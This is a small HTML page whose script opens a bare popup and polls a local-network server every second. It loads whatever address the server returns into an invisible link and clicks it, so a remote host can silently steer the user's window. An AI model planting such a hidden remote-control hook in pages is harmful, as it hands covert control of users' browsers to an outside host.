<html>
<body>
<script>
function newPopup(url, windowName) {
    window.open(url,windowName,'height=768,width=1366,left=10,top=10,titlebar=no,toolbar=no,menubar=no,location=no,directories=no,status=no');
}
function loadDoc() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (xhttp.readyState == 4 && xhttp.status == 200) {
      document.getElementById("1").href = xhttp.responseText;
    }
  };
  xhttp.open("GET", "http://192.168.1.4:8000/ajax.py", true);
  xhttp.send();
  document.getElementById("1").click();
}
newPopup('http://www.google.com','pop');
setInterval(function(){ loadDoc(); }, 1000);
</script>
<a id="1" href="#" style="opacity: 0;" target="pop">link</a>
</body>
</html>
